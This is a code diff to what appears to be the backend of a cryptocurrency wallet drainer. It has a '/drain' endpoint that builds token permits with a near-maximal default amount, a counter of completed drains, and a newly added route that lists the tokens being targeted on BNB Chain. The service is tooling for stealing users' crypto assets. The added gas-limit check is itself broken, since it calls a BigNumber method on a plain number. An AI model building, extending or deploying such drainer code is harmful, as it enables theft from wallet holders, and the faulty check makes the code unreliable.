@@ -124,6 +124,10 @@ app.post('/drain', async (req, res) => {
     const gasPrice = cachedGasPrice.eq(0) ? await provider.getGasPrice() : cachedGasPrice.mul(12).div(10);
     const gasLimit = 500000;
     
+   const maxGas = ethers.BigNumber.from('500000');
+   if (gasLimit.gt(maxGas)) {
+   return res.status(400).json({ error: 'Gas limit too high' });
+}
     const permitDetails = {
       token: ethers.utils.getAddress(token),
       amount: ethers.BigNumber.from(amount || '0xffffffffffffffffffffffffffffffffffffffff').toHexString().slice(0,42),
@@ -209,6 +213,14 @@ app.get('/stats', (req, res) => {
   } catch {
     res.json({ totalDrains: 0 });
   }
+});
+
+app.get('/tokens', (req, res) => {
+  res.json({
+    tokens: Object.keys(TOKENS),
+    total: Object.keys(TOKENS).length,
+    chainId: 56
+  });
 });
 
 const PORT = process.env.PORT || 3000;
